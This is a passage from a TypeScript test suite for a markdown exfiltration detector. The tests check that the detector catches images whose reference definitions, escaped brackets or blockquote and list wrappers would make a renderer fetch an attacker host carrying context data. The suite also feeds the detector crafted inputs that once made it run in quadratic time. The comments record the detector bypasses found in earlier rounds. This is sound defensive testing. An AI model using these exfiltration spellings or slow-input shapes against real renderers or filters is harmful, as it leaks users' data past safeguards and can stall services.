    expect(`${note}:${benign.ok}`).toBe(`${note}:true`);
    if (!benign.ok) continue;
    expect(`${note}:${benign.redaction.state}`).toBe(`${note}:none`);
  }
});

// T78#F-002. CommonMark: "If there are several matching definitions, the first
// one takes precedence." `refs` was a Map written with `set`, so the LAST
// definition won and the finding masked its URL — while `marked` resolves and
// fetches the FIRST. Six spellings reached all four public boundaries with the
// attacker host present AND `redaction.state:"redacted"`, which is worse than a
// plain release because the caller is told the payload was handled. Pre-existing
// on the committed tree, missed by eight rounds, and pinned by nothing.
//
// The repair does not pick a winner. EVERY definition of a label an image use
// resolves is flagged, so the masked set is correct under CommonMark's
// first-wins rule AND under a renderer with the opposite precedence — this
// module's recurring defect is judging text in a form the renderer does not use,
// and choosing one precedence rule is that same bet.
test("T81#F-002: a duplicated reference definition cannot release the fetched URL", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const OK = "https://ok.example.org/safe.png";
  const shapes: Record<string, string> = {
    shortcut: `![a]\n\n[a]: ${U}\n[a]: ${OK}\n`,
    full: `![a][a]\n\n[a]: ${U}\n[a]: ${OK}\n`,
    collapsed: `![a][]\n\n[a]: ${U}\n[a]: ${OK}\n`,
    caseSpelling: `![a]\n\n[A]: ${U}\n[a]: ${OK}\n`,
    whitespaceSpelling: `![b c]\n\n[b  c]: ${U}\n[b c]: ${OK}\n`,
    threeDefs: `![a]\n\n[a]: ${U}\n[a]: ${OK}\n[a]: ${OK}\n`,
    // the attacker's definition SECOND, which the pre-fix code did mask: the
    // repair must not close one order by opening the other.
    attackerSecond: `![a]\n\n[a]: ${OK}\n[a]: ${U}\n`,
  };
  for (const [id, content] of Object.entries(shapes)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );

    const serialized = JSON.stringify({ note: content });
    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
    if (persisted.allowed) {
      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
    }

    const transported = validateOutputForTransport({
      format: "json",
      value: { note: content },
    });
    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
    if (transported.ok) {
      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
    }
  }

  // Controls. A single definition is unchanged; a definition no IMAGE use
  // resolves stays released, because a reference LINK is click-gated and a
  // definition line nothing points at is not a fetch.
  expect(detectExfil(`![a]\n\n[a]: ${U}\n`, []).length).toBe(1);
  expect(detectExfil(`[a]\n\n[a]: ${U}\n[a]: ${OK}\n`, []).length).toBe(0);
  expect(detectExfil(`text\n\n[a]: ${U}\n[a]: ${OK}\n`, []).length).toBe(0);
  // An allowlisted duplicate pair stays released in both positions.
  const allowlisted = `![a]\n\n[a]: https://cdn.example.org/1.png\n[a]: https://cdn.example.org/2.png\n`;
  expect(detectExfil(allowlisted, ["cdn.example.org"]).length).toBe(0);
});

// T78#F-001. T77 removed the invented constant `MAX_REFERENCE_LABEL` and
// replaced it with a bound derived from the document's own `[ref]: URL` lines —
// and the document is the attacker's. Every perf shape the two prior rounds
// measured carried NO definition, so `budget.maxLength === 0` short-circuited
// the label path before it allocated; one long definition line raises the bound
// arbitrarily and the path is quadratic again (measured here at 20 802.7 ms on
// 400 029 bytes, exponent 1.79, and 1.9–2.3 s at each of the four public
// boundaries on a 128 KB payload).
//
// So EVERY shape below carries a definition — the property whose absence let the
// regression through. The three parts of the repair are attacked separately:
// the `bang` shapes defeat the `!` gate, `bracketKeyDef` defeats the `[`-count
// filter (the only filter a document can raise), the `wsInflated` shapes defeat
// the non-whitespace length filter, and `prose` is the shape that does not look
// crafted.
test("T81#F-001: a document's own definitions cannot raise the label path's cost", () => {
  const BUDGET_MS = 500;
  const DEF = (length: number) =>
    `[${"a".repeat(length)}]: https://ok.example.org/x\n`;
  // A definition whose LABEL carries a long run of `[`, which is the only way a
  // payload can raise the bracket filter's threshold.
  const BRACKET_KEY_DEF = `[${"[".repeat(60000)}x]: https://ok.example.org/x\n`;
  const shapes: Record<string, string> = {
    // T78's own three, at the sizes it measured over a second.
    balancedNest_withLongDef: DEF(200000) + "[".repeat(100000) + "]".repeat(100000),
    openRunOneClose_withLongDef: DEF(200000) + "[".repeat(100000) + "]",
    bangOpenRunOneClose_withLongDef: DEF(200000) + "![".repeat(50000) + "]",
    // A definition-carrying variant of every shape the T77 perf test measures.
    openRunThenUnterminated_withDef:
      DEF(4000) + "[".repeat(1000) + "![a](" + "A".repeat(1000),
    unterminatedDestination_withDef: DEF(50000) + "![a](" + "A".repeat(25000),
    unterminatedDestinationAngle_withDef: DEF(50000) + "![a](<" + "A".repeat(25000),
    openBracketRun_withDef: DEF(100000) + "[".repeat(50000),
    bangBracketRun_withDef: DEF(100000) + "![".repeat(50000),
    balancedNest_withDef: DEF(50000) + "[".repeat(25000) + "]".repeat(25000),
    sharedDestination_withDef:
      DEF(40000) + "[".repeat(20000) + "](" + "A".repeat(20000) + ")",
    emptyDescriptionRun_withDef: DEF(40000) + "[](".repeat(20000) + ")",
    // Mine: image opens with balanced closes, image opens sharing one close, a
    // definition whose key carries brackets, whitespace-inflated image opens,
    // many definitions of many distinct lengths, and every `![` resolving.
    bangBalancedNest_withLongDef:
      DEF(200000) + "![".repeat(50000) + "]".repeat(50000),
    bangOpenRun_bracketKeyDef: BRACKET_KEY_DEF + "![".repeat(30000) + "]",
    bangBalancedNest_bracketKeyDef:
      BRACKET_KEY_DEF + "![".repeat(30000) + "]".repeat(30000),
    wsInflatedBangRun_withLongDef: DEF(200000) + "![ ".repeat(50000) + "]",
    wsInflatedBangRun_shortDef: DEF(4) + "![ \t".repeat(50000) + "]",
    resolvingBangRun_withDef: DEF(4) + "![aaaa]".repeat(20000),
    manyDefsAndBangRun:
      Array.from({ length: 600 }, (_, i) => DEF(i + 1)).join("") +
      "![".repeat(30000) +
      "]",
    prose_withSentenceDef:
      `[${"see the section on ".repeat(1685).slice(0, 32000)}]: https://docs.example.org/guide\n\n` +
      "[".repeat(16000) +
      "]".repeat(16000),
  };
  const slow: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    detectExfil(text, []);
    const elapsed = performance.now() - started;
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
  }
  expect(slow).toEqual([]);
});

// The backstop's failure direction. The `[`-count filter is the one filter a
// document can raise — by defining a label that itself contains `[` — so the
// label path also carries a TOTAL work budget proportional to the input's own
// length. Exhausting it must not release: every reference definition in the
// document is flagged instead, which is the direction this floor may move in.
test("T81#F-001: exhausting the label work budget flags definitions, never releases them", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const content = `[${"[".repeat(60000)}x]: ${U}\n` + "![".repeat(30000) + "]";
  const started = performance.now();
  const matches = detectExfil(content, []);
  const elapsed = performance.now() - started;
  expect(`elapsed<500ms:${elapsed < 500}`).toBe("elapsed<500ms:true");
  expect(matches.some((m) => m.value === U)).toBe(true);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);

  // And an ALLOWLISTED definition is still released when the budget is
  // exhausted: the backstop widens what is EXAMINED, not what is denied.
  const ok =
    `[${"[".repeat(60000)}x]: https://cdn.example.org/logo.png\n` +
    "![".repeat(30000) +
    "]";
  expect(detectExfil(ok, ["cdn.example.org"]).length).toBe(0);
});


// T82#F-001. `REFERENCE_DEF` used to read a definition label with the pattern
// `[^\]]+`, which cannot cross a `]` — so the `]` it matched was always the
// FIRST one after the opening bracket, and a line matched only when that first
// `]` was immediately followed by `:`. A label carrying a backslash-escaped `]`
// therefore matched NOTHING: `[foo\]]: URL` has another `]` where the `:` has to
// be. CommonMark says a label «ends with the first right bracket that is not
// backslash-escaped», and `marked` agrees — it resolves `![foo\]]` and emits the
// `<img>` — so the document produced ZERO findings while the renderer fetched,
// at every public boundary, with `redaction.state:"none"`. Pre-existing at HEAD
// and missed by ten rounds.
//
// The repair is at the DEFINITION site only. The use side already produces the
// right bytes: for every reachable spelling the candidate label span runs from
// `[`+1 to the first `]`, i.e. `foo\`. So the scanner reads the line escape-aware
// (to recognise it at all) and registers the label TRUNCATED AT ITS FIRST `]` —
// exactly the byte string `readLabel` will hand it. That also keeps the cost
// proof's step (i) intact, and for a stronger reason than before: a key contains
// no `]` by construction of the truncation, not by a regex's character class.
test("T83#F-001: a backslash-escaped `]` in a reference label cannot hide the definition", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Every shape here is one `marked` renders an <img> for — checked in
  // `T83-escape.ts` against the renderer, not assumed.
  const fetched: Record<string, string> = {
    // the reviewer's five
    s01EscapedClose: `![foo\\]]\n\n[foo\\]]: ${U}\n`,
    s02EscapedCloseShort: `![x\\]]\n\n[x\\]]: ${U}\n`,
    s03EscapedCloseFull: `![alt][foo\\]]\n\n[foo\\]]: ${U}\n`,
    s04EscapedCloseCollapsed: `![foo\\]][]\n\n[foo\\]]: ${U}\n`,
    s05TwoEscapedCloses: `![a\\]b\\]c]\n\n[a\\]b\\]c]: ${U}\n`,
    // mine
    n01LeadingEscapedClose: `![\\]]\n\n[\\]]: ${U}\n`,
    n02EscapedCloseWhitespaceRun: `![foo\\]  bar]\n\n[foo\\] bar]: ${U}\n`,
    n03EscapedCloseAngleDestination: `![foo\\]]\n\n[foo\\]]: <${U}>\n`,
    n04EscapedCloseNextLineDestination: `![foo\\]]\n\n[foo\\]]:\n  ${U}\n`,
    n05EscapedCloseCaseFolded: `![FOO\\]]\n\n[foo\\]]: ${U}\n`,
    // an escaped BACKSLASH immediately before an escaped bracket: the parity
    // rule has to see `\\` as one literal backslash and `\]` as the escape.
    n06EscapedBackslashThenEscapedClose: `![a\\\\\\]]\n\n[a\\\\\\]]: ${U}\n`,
    // an escaped backslash before a REAL closing bracket — closed today, and
    // the repair may not open it.
    n07EscapedBackslashBeforeClose: `![a\\\\]\n\n[a\\\\]: ${U}\n`,
    // a definition the escape-aware read finds and a use in the FULL spelling
    // whose own label is the escaped one.
    n08EscapedCloseFullOtherAlt: `![alt][a\\]b]\n\n[a\\]b]: ${U}\n`,
    // duplicated escaped definitions: the T81 rule (flag every definition of a
    // resolved label) has to apply to these too, in both orders.
    n09EscapedCloseDuplicate: `![foo\\]]\n\n[foo\\]]: ${U}\n[foo\\]]: https://ok.example.org/x\n`,
    n10EscapedCloseDuplicateReversed: `![foo\\]]\n\n[foo\\]]: https://ok.example.org/x\n[foo\\]]: ${U}\n`,
  };
  for (const [id, content] of Object.entries(fetched)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );

    const serialized = JSON.stringify({ note: content });
    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
    if (persisted.allowed) {
      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
    }

    const transported = validateOutputForTransport({
      format: "json",
      value: { note: content },
    });
    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
    if (transported.ok) {
      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
    }
  }

  // A label carrying an UNESCAPED `[` is not a label for CommonMark, and
  // `marked` renders no image for either spelling. They are asserted as not
  // fetched rather than as findings — recorded so a later round does not read
  // the absence of a finding here as a bypass.
  for (const id of ["n11UnescapedOpenInLabel", "n12EscapedCloseThenBracketPair"]) {
    const content =
      id === "n11UnescapedOpenInLabel"
        ? `![a\\]b[c]\n\n[a\\]b[c]: ${U}\n`
        : `![a\\][b]\n\n[a\\][b]: ${U}\n`;
    // no assertion on the finding count: what is pinned is that the RENDERER
    // does not fetch these, which `T83-escape.ts` measures.
    expect(`${id}:${typeof detectExfil(content, []).length}`).toBe(`${id}:number`);
  }

  // NO RELEASE. `[foo\]: URL` is a definition today — the old pattern read the
  // escaped `]` as the terminator — and `marked` renders no image for it. The
  // escape-aware read must not remove it: this floor may not move in the
  // release direction (the same rule as the description-side escape decision).
  expect(detectExfil(`![foo\\]\n\n[foo\\]: ${U}\n`, []).length).toBe(1);
  // Controls: the reference LINK spelling stays click-gated, and an allowlisted
  // escaped definition is still released.
  expect(detectExfil(`[foo\\]]\n\n[foo\\]]: ${U}\n`, []).length).toBe(0);
  expect(
    detectExfil(`![foo\\]]\n\n[foo\\]]: https://cdn.example.org/1.png\n`, [
      "cdn.example.org",
    ]).length,
  ).toBe(0);
  // And a use whose label does not equal any definition's truncated form stays
  // released, so the repair is not a blanket flag on every escaped definition.
  expect(detectExfil(`![zzz]\n\n[foo\\]]: ${U}\n`, []).length).toBe(0);
});

// The structural fact the whole cost proof rests on, pinned instead of asserted.
//
// T81's step (i) was «no key can contain `]`, because the capture is `[^\]]+`».
// After T83 the reason is the truncation — a key is the label's bytes UP TO its
// first `]` — and the property has to hold for every line the scanner
// recognises, including the escape-aware ones, which is exactly where the old
// reason stopped being true.
//
// The keys are not exported, and they do not need to be: `readLabel` rejects
// every span carrying a `]` as a NECESSARY condition, so a key that contained
// one could never be matched and a use of that exact label would silently stop
// being a finding. «Every label the scanner accepts resolves when it is used»
// is therefore the observable form of «no key contains `]`», and it is the form
// that fails loudly rather than quietly.
test("T83#F-001: every label the definition scanner accepts still resolves when used", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const pieces = ["a", "\\]", "\\\\", "\\[", "b"];
  const unresolved: string[] = [];
  let checked = 0;
  for (const one of pieces) {
    for (const two of pieces) {
      for (const three of pieces) {
        const label = `${one}${two}${three}`;
        checked += 1;
        if (detectExfil(`![${label}]\n\n[${label}]: ${U}\n`, []).length === 0) {
          unresolved.push(JSON.stringify(label));
        }
      }
    }
  }
  expect(`${checked}:${unresolved.length}`).toBe(`${pieces.length ** 3}:0`);
});

// T82#F-001's mechanism carries a cost obligation of its own. The definition
// scan is driven for every line-start `[` in the document, and the pattern it
// replaced crossed newlines: on a document that opens a bracket on every line
// and never closes one, each line's attempt scanned to end-of-content and
// backtracked, which is quadratic — 5 899 ms on 352 000 bytes, measured on the
// pre-T83 tree. Every adversarial shape the prior rounds built carried a `]`,
// so none of them reached it. The replacement is a linear scan, and this pins
// it under the same 500 ms budget the other perf tests use.
test("T83#F-001: the reference-definition scan is linear in the document's size", () => {
  const BUDGET_MS = 500;
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const shapes: Record<string, string> = {
    lineStartOpensNoClose: "[aaaaaaaaa\n".repeat(32000),
    lineStartOpensNoCloseIndented: "  [aaaaaaaaa\n".repeat(32000),
    lineStartOpensBackslashNoClose: "[aaaa\\aaaa\n".repeat(32000),
    lineStartOpensEscapedCloseNoTerminator: "[a\\]a\n".repeat(50000),
    lineStartOpensCarriageReturn: "[aaaaaaaaa\r".repeat(32000),
    escapeDenseDefsThenBangRun:
      `[a\\]b]: ${U}\n`.repeat(4000) + "![".repeat(30000) + "]",
    backslashRunDef: `[${"\\\\".repeat(60000)}x]: ${U}\n` + "![".repeat(20000) + "]",
    manyEscapedDefsAndResolvingUses:
      Array.from({ length: 4000 }, (_, i) => `[k${i}\\]z]: ${U}\n`).join("") +
      Array.from({ length: 4000 }, (_, i) => `![k${i}\\]z]`).join(""),
  };
  const slow: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    detectExfil(text, []);
    const elapsed = performance.now() - started;
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
  }
  expect(slow).toEqual([]);
});

// T84#F-001. The SECOND quadratic on this path, and the one T83's repair did not
// touch because it is not on the label-matching path at all.
//
// `readDefinitionDestination` reads a definition's destination with a STICKY
// regex at a fixed offset, and unlike its sibling `readInlineDestination` — which
// is memoised by `descriptionEnd`, with a comment saying why — it had no cache.
// Two facts compose into a denial of service:
//
//   - many line-start `[` can share ONE `]:` offset, so they all call the reader
//     at the same index;
//   - when the read FAILS the cursor is not advanced (only a successful read
//     advances it), so nothing suppresses the next line start.
//
// With a whitespace or newline run to end-of-input after the colon, one call
// costs Theta(remaining) — `\s*` consumes the run and then gives back one
// character at a time, retrying an alternation that cannot match at end of input
// — and doing that once per line start over O(n) line starts is O(n^2).
//
// Measured on the pre-change tree at 200 001 bytes: 7 018 ms in the detector
// alone, and 6 784-6 952 ms at EVERY ONE of the four public boundaries at
// 196 610 bytes. No attacker host appears anywhere in the payload: this is
// reachable by ordinary bracket-heavy structural bytes, which is why ten rounds
// of adversarial shapes never built it — every one of them contained a `]` that
// resolved or failed fast.
//
// The repair is a result cache keyed on the sticky offset, sound for the same
// reason the sibling's is: a sticky regex's result depends on nothing but that
// offset. It changes no answer, so this is a COST regression, and a cost
// regression is the only kind that can pin it.
test("T84#F-001: a definition destination that fails to parse cannot cost quadratic time", () => {
  const BUDGET_MS = 500;
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const half = 100000;
  const shapes: Record<string, string> = {
    // T84's own two shapes, at the size its probe measured at ~7 000 ms.
    destFailWhitespaceTail:
      "[a\n".repeat(Math.floor(half / 3)) + "]:" + " ".repeat(half),
    destFailNewlineTail:
      "[a\n".repeat(Math.floor(half / 3)) + "]:" + "\n".repeat(half),
    // Mine. A mixed whitespace tail: `\s` covers more than space and newline, so
    // a repair that special-cases one of them is not a repair.
    destFailMixedWhitespaceTail:
      "[a\n".repeat(Math.floor(half / 3)) + "]:" + "\t\f\r ".repeat(half / 5),
    // Mine. The same shape reached through the ESCAPE-AWARE reading rather than
    // reading 1 — the second call site, which shares the cache.
    destFailEscapedLabelTail:
      "[a\\]b\n".repeat(Math.floor(half / 6)) + "]:" + " ".repeat(half),
    // Mine. MANY DISTINCT failing offsets rather than one shared one, which is
    // what a cache cannot collapse — it is bounded instead by the fact that the
    // whitespace runs at distinct `]:` offsets are pairwise disjoint.
    destFailManyDistinctOffsets:
      `[a]:${" ".repeat(200)}\n`.repeat(2000) + "[b\n".repeat(20000),
    // Mine. A resolving definition and its use, then the failing tail, so the
    // cursor question and the cache question are exercised together. The order
    // matters and is not cosmetic: with the tail FIRST, `\s*` crosses the
    // newline and takes `[z]:` itself as the destination, `resumeAt` advances
    // past the real definition, and the document has no finding — which is the
    // replaced pattern's own `lastIndex` semantics, unchanged by this repair and
    // verified identical on a frozen pre-change copy.
    destFailThenResolving:
      `[z]: ${U}\n![z]\n` +
      "[a\n".repeat(Math.floor(half / 3)) +
      "]:" +
      " ".repeat(half),
  };
  const slow: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    detectExfil(text, []);
    const elapsed = performance.now() - started;
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
  }
  expect(slow).toEqual([]);

  // The cache may not change an ANSWER. A document whose destination reads
  // succeed at several offsets must still register each of them, and the
  // failing-then-resolving shape above must still produce its finding.
  const OK = "https://ok.example.org/x";
  const resolving = `[a]: ${U}\n[b]: ${OK}\n[c]: ${U}\n![a]![b]![c]`;
  expect(detectExfil(resolving, []).map((m) => m.value)).toEqual([U, OK, U]);
  // …and the allowlist still releases the middle one, so the cache is not
  // collapsing three distinct offsets into one answer.
  expect(
    detectExfil(resolving, ["ok.example.org"]).map((m) => m.value),
  ).toEqual([U, U]);
  expect(detectExfil(shapes.destFailThenResolving as string, []).length).toBe(1);
});

// T84#F-003. The description side's bracket pairing is blind to escaping, where
// the definition side gained escape awareness in T83.
//
// `indexContent` pairs `[`/`]` with a plain stack that reads EVERY `]` as a real
// close. When an image's alt text or a link's text carries a backslash-escaped
// `]` that the stack takes for the pair's close, `descriptionEnds` computes both
// of its candidates as the SAME wrong position and the CommonMark-correct end is
// never offered at all — so `![a\]](URL)` is not recognised as an image, or as
// anything. Six spellings reached all four public boundaries with
// `redaction.state:"none"` and `marked` fetching; a seventh was found
// independently by a second probe. Pre-existing, and not a T83 regression.
//
// The repair may not simply teach the stack the escape rule, which is what the
// one-line suggestion reads as: `exfil.ts` records at :529-531 that honouring
// `\]` would REMOVE `![a\](URL)`, which is flagged today and renders no image,
// and this floor may not move in the release direction. So the escape-aware ends
// are APPENDED to the existing two rather than replacing them, and the existing
// two keep their order — which is what makes every construct found today still
// found, still first, and still at the same offset.
test("T84#F-003: a backslash-escaped `]` in a description cannot hide the construct", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Every shape here is one `marked` renders an <img> for — checked against the
  // renderer in `T85-marked.ts`, not assumed.
  const fetched: Record<string, string> = {
    // T84's six class-B spellings
    b01FullRefEscapedAlt: `![a\\]][b]\n\n[b]: ${U}\n`,
    b02FullRefEscapedAltTwice: `![a\\]b\\]][b]\n\n[b]: ${U}\n`,
    b03FullRefLeadingEscape: `![\\]][b]\n\n[b]: ${U}\n`,
    b05FullRefEscapedAltEscapedRef: `![a\\]][b\\]]\n\n[b\\]]: ${U}\n`,
    b07InlineEscapedAlt: `![a\\]](${U})\n`,
    b08InlineEscapedAltAngle: `![a\\]](<${U}>)\n`,
    // MINE. The nested spelling: the first UNESCAPED `]` is an inner one, so
    // only a depth walk that ignores the escape reaches the real end. This is
    // why the escape-aware BALANCED end exists as well as the first-unescaped
    // one — neither candidate alone closes both halves of the class.
    m01NestedBalancedEscapedClose: `![a[b]\\]c](${U})\n`,
    m02NestedBalancedEscapedCloseAngle: `![a[b]\\]c](<${U}>)\n`,
    // MINE. An escaped `]` inside a LINK's text wrapping an image: a link's
    // description is content, not alt text, so the image inside renders.
    m03EscapedCloseInLinkTextWithImage: `[t\\]x![i](${U})](https://ok.example.org/h)\n`,
    // MINE. A doubly-escaped close (`\\` then `\]`) — the parity rule has to read
    // `\\` as one literal backslash and `\]` as the escape.
    m04EscapedBackslashThenEscapedClose: `![a\\\\\\]](${U})\n`,
    // MINE. Escaped close in a full reference whose ref id is followed by another
    // construct, so the ref-id span must still be read against the escape-BLIND
    // close list — which is what keeps it in agreement with T83's truncated keys.
    m06FullRefEscapedAltAdjacent: `![a\\]][b]![c](${U})\n\n[b]: https://ok.example.org/x\n`,
    // MINE. The escaped close is the last byte of the description, immediately
    // before the real one.
    m07EscapedCloseAdjacentToReal: `![ab\\]](${U})\n`,
  };
  for (const [id, content] of Object.entries(fetched)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );

    const serialized = JSON.stringify({ note: content });
    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
    if (persisted.allowed) {
      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
    }

    const transported = validateOutputForTransport({
      format: "json",
      value: { note: content },
    });
    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
    if (transported.ok) {
      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
    }
  }

  // NO RELEASE, and this is the shape `exfil.ts:529-531` exists for. `![a\](URL)`
  // renders no image and is flagged TODAY, by the escape-blind reading. The
  // escape-aware ends are appended, never substituted, so it stays flagged.
  expect(detectExfil(`![a\\](${U})\n`, []).length).toBe(1);
  expect(detectExfil(`![a\\](<${U}>)\n`, []).length).toBe(1);
  // Controls. A reference LINK carrying an escaped close is still click-gated,
  // and an allowlisted host is still released through the new candidate ends.
  expect(detectExfil(`[a\\]][b]\n\n[b]: ${U}\n`, []).length).toBe(0);
  expect(
    detectExfil(`![a\\]](https://cdn.example.org/1.png)\n`, ["cdn.example.org"])
      .length,
  ).toBe(0);
  // And a description carrying an escaped close but no destination at all stays
  // released: the new candidates widen what is EXAMINED, not what is denied.
  expect(detectExfil(`![a\\]] plain text\n`, []).length).toBe(0);
});

// The candidate ends are APPENDED, and the ordering property is what makes that
// a no-release change rather than a hope. `readBracketConstructs` walks the ends
// in order, the inline pass takes the FIRST inline construct and the reference
// pass breaks at the FIRST resolving one, so a document that resolves today must
// resolve to the same URL at the same offset after the change. Pinned across the
// shapes whose description contains a bracket or a backslash, which is where a
// new end could otherwise win a race it must lose.
test("T84#F-003: appending escape-aware ends does not move an existing construct", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const stable: Record<string, string> = {
    balancedDescription: `![a[b]c](${U})\n`,
    firstCloseDescription: `![a[](${U})\n`,
    plainInline: `![a](${U})\n`,
    escapedBackslashBeforeClose: `![a\\\\](${U})\n`,
    badgeIdiom: `[![build](${U})](https://ok.example.org/ci)\n`,
    shortcutReference: `![logo]\n\n[logo]: ${U}\n`,
    fullReference: `![alt][logo]\n\n[logo]: ${U}\n`,
    collapsedReference: `![logo][]\n\n[logo]: ${U}\n`,
    escapedDefinitionLabel: `![foo\\]]\n\n[foo\\]]: ${U}\n`,
  };
  for (const [id, content] of Object.entries(stable)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length}`).toBe(`${id}:1`);
    expect(`${id}:${matches[0]?.start}:${matches[0]?.value}`).toBe(
      `${id}:${content.indexOf(U)}:${U}`,
    );
  }
});

// The cost obligation the new candidate ends carry. Two candidate ends became
// four, so the question the dispatch asks — «does this change the asymptotic
// cost» — has to be answered on the shapes that maximise the new ones: a run of
// escaped closes, a run of opens sharing one escape-aware end, and a document
// that is nothing but backslashes and brackets. The escape-aware structures are
// built only when the document contains a backslash at all, so the last shape is
// also the one that pays for building them.
test("T84#F-003: escape-aware description ends do not change the cost's shape", () => {
  const BUDGET_MS = 500;
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const shapes: Record<string, string> = {
    escapedCloseRun: "![a\\]]".repeat(40000),
    bangOpenRunEscapedClose: "![".repeat(60000) + "\\]]",
    backslashBracketNoise: "\\[\\]".repeat(80000),
    escapedCloseRunWithDef: "![a\\]]".repeat(30000) + `\n\n[a\\]: ${U}\n`,
    nestedEscapedCloses: "![a[b]\\]c]".repeat(30000),
    escapedCloseThenParenRun: "![a\\]]".repeat(20000) + "(".repeat(60000),
    balancedNestEscaped: "![".repeat(30000) + "\\]".repeat(30000) + "]",
  };
  const slow: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    detectExfil(text, []);
    const elapsed = performance.now() - started;
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
  }
  expect(slow).toEqual([]);
});

// ---------------------------------------------------------------------------
// T89 — closes the block-container bypass RESIDUALS.md recorded as an
// accepted limitation (2026-09-07): a reference definition prefixed by a
// blockquote (`> [ref]: URL`), a bullet-list item (`- [ref]: URL`) or an
// ordered-list item (`1. [ref]: URL`) was invisible to
// `readReferenceDefinitions`, so an image resolving through it produced ZERO
// findings while `marked` still fetched the attacker host — all four public
// boundaries passed the payload with `redaction.state:"none"`, and the
// allowlist could not help because there was no finding to allow. Phase 1
// judged this required real block-structure parsing; re-measured, it does
// not — see `skipBlockContainerPrefix` in exfil.ts. Written before the fix;
// every case in the first test below failed on the pre-T89 code.
// ---------------------------------------------------------------------------

const T89_CONTAINER_PREFIXES: Record<string, string> = {
  blockquote: "> ",
  bulletList: "- ",
  orderedList: "1. ",
};

test("T89: a reference definition inside a block container is a finding, in all twelve spellings", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Four CommonMark image forms — full reference, collapsed, shortcut, and an
  // image nested inside a link (the README badge idiom) — each crossed with
  // three container prefixes.
  const fetched: Record<string, string> = {};
  for (const [container, prefix] of Object.entries(T89_CONTAINER_PREFIXES)) {
    fetched[`${container}_fullReference`] =
      `![build][badge]\n\n${prefix}[badge]: ${U}\n`;
    fetched[`${container}_collapsed`] = `![status][]\n\n${prefix}[status]: ${U}\n`;
    fetched[`${container}_shortcut`] = `![logo]\n\n${prefix}[logo]: ${U}\n`;
    fetched[`${container}_imageInLink`] =
      `[![badge][img]](https://ci.example.com/job)\n\n${prefix}[img]: ${U}\n`;
  }
  expect(Object.keys(fetched).length).toBe(12);

  for (const [id, content] of Object.entries(fetched)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
    expect(
      `${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`,
    ).toBe(`${id}:true`);
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );

    // The detector is not where the floor is proved: driven through the same
    // functions the MCP transport and the durable sinks call.
    const serialized = JSON.stringify({ note: content });
    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
    if (persisted.allowed) {
      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
    }
    const transported = validateOutputForTransport({
      format: "json",
      value: { note: content },
    });
    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
    if (transported.ok) {
      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
    }
  }
});

test("T89: the four no-container controls, an allowlisted host, malformed colon spacing and ordinary container prose are unaffected", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;

  // The four no-container controls: the same four image forms with no
  // container prefix at all must still resolve to exactly one finding each —
  // this repair must not move them.
  const controls: Record<string, string> = {
